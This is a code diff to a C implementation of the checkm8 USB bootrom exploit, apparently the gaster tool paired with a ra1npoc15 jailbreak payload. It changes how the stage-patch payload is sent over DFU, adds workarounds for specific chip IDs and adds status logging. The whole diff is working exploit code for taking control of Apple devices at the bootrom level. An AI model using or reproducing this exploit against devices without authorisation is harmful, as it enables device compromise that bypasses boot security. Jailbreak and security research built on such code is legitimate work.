@@ -948,10 +948,14 @@ checkm8_stage_patch(const usb_handle_t *handle) {
         LOG_ERROR("failed to leak data");
         return false;
     }
+
+    // related to overwrite region probably
     for(i = 0; i < 2; i++) {
         LOG_DEBUG("i = %zu", i);
         send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, NULL);
     }
+
+#if 0
     if(p != NULL && send_usb_control_request(handle, 0x00, 0, 0, 0x00, p, 0x30, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
         ret = true;
         for(i = 0; ret && i < data_sz; i += packet_sz) {
@@ -959,6 +963,27 @@ checkm8_stage_patch(const usb_handle_t *handle) {
             ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
         }
         send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
+    }
+#endif
+
+    if(p != NULL && send_usb_control_request(handle, 0x00, 0, 0, 0x00, p, 0x30, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
+        ret = true;
+        for(i = 0; ret && i < data_sz; i += packet_sz) {
+            packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
+            ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
+        }
+        if(ret) {
+            if(cpid == 0x8011 || cpid == 0x8012) {
+                // Do nothing, fixes A10X and T2
+            } else {
+                send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, NULL);
+                send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
+            }
+
+            dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
+            dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
+            dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
+        }
     }
     free(data);
     return ret;
@@ -1010,12 +1035,13 @@ static void checkm8_boot_pongo(usb_handle_t *handle) {
             send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, (unsigned char*)&out[len], size, &transfer_ret);
             if(transfer_ret.sz != size || transfer_ret.ret != USB_TRANSFER_OK)
             {
-        LOG_DEBUG("retrying at len = %zu", len);
+                LOG_DEBUG("retrying at len = %zu", len);
                 sleep_ms(100);
                 goto retry;
             }
+
             len += size;
-        LOG_DEBUG("len = %zu", len);
+            LOG_DEBUG("len = %zu", len);
         }
     }
     send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
@@ -1080,10 +1106,19 @@ gaster_checkm8(usb_handle_t *handle) {
 
                 ret = checkm8_stage_patch(handle);
                 stage = STAGE_RESET;
-            }
+
+#ifdef HAVE_LIBUSB
+                if (cpid == 0x8960) {
+                    LOG_INFO(
+                        "[A7 on libusb] Unplug and replug the device now (at least 2 times)\n"
+                        "[A7 on libusb] The handle should reset and stage should succeed."
+                    );
+                }
+#endif
+           }
 
             const char* st_s = stage_to_string(stage);
-            if (ret) {
+            if(ret) {
                 LOG_DEBUG("Stage %s succeeded, ret code %d", st_s, ret);
             } else {
                 LOG_ERROR("Stage %s failed, ret code %d", st_s, ret);
@@ -1092,6 +1127,7 @@ gaster_checkm8(usb_handle_t *handle) {
             reset_usb_handle(handle);
         } else {
             stage = STAGE_PWNED;
+            LOG_INFO("gaster with ra1npoc15 payload complete");
         }
         close_usb_handle(handle);
     }
